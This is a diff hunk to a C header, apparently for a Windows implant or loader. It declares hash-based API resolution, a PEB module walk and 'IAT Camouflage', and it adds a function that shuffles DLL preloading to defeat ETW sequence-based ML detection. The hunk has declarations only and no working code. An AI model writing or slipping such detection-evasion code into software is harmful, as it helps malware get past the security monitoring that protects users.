@@ -157,6 +157,10 @@ PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash);
 PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
 // Case-insensitive PEB walk by exact upper-case BaseDllName (e.g. L"NTDLL.DLL").
 PVOID FindLoadedModuleW(IN PCWSTR szUpperName);
+// Fisher-Yates shuffle + LoadLibraryA on the provided DLL names. Forces the
+// ETW image-load ordering to differ per run, defeating sequence-based ML
+// that learns deterministic loader DLL fingerprints.
+VOID  ShufflePreloadLibraries(IN PAPI_HASHING pApi, IN LPCSTR* pNames, IN DWORD dwCount);
 
 // ----------- IAT Camouflage -----------
 VOID IatCamouflage(VOID);
